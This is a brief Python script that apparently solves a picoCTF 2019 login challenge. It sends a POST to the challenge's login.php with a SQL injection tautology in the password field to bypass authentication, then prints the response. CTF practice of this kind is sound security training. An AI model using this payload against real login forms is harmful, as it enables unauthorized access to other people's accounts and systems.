#!/usr/bin/env python
import requests
import sys
from urllib.parse import urljoin


def solve(url='http://2019shell1.picoctf.com:4162'):
    req = requests.Session()

    # SELECT * FROM users WHERE name='admin' AND password='admin'

    data = {
        'username': 'admin',
        'password': "ad' or '2'='2",
        'debug': '1',
    }

    r = req.post(urljoin(url, '/login.php'), data=data)
    print(r, r.url, r.headers)
    print(r.text)


if __name__ == '__main__':
    print(solve(*sys.argv[1:]))
